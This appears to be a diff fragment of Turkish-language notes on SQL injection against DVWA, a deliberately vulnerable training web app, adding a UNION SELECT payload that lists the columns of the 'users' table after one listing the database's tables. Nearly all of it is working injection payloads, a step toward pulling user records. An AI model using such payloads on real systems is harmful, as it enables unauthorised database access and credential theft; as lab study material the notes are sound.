@@ -19,3 +19,6 @@ Veritabanının İsim Bilgisi
 
 Veritabanındaki Tabloların Belirlenmesi
 1′ UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema = ‘dvwa’ #
+
+Tabloların Kolonlarının Belirlenmesi
+1′ UNION SELECT column_name,2 FROM information_schema.columns WHERE table_schema=’dvwa’ AND table_name=’users’ # 
